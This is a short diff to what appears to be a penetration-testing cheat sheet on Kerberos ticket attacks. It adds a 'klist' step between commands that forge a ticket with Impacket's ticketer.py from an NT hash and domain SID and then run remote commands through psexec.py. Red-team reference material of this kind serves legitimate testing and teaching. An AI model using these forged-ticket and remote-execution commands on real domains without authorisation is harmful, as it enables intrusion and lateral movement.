@@ -290,6 +290,11 @@ python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain
 export KRB5CCNAME=<TGS_ccache_file>
 ```
 
+#### List tickets
+```bash
+klist
+```
+
 #### Execute remote commands with any of the following by using the TGT
 ```bash
 python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
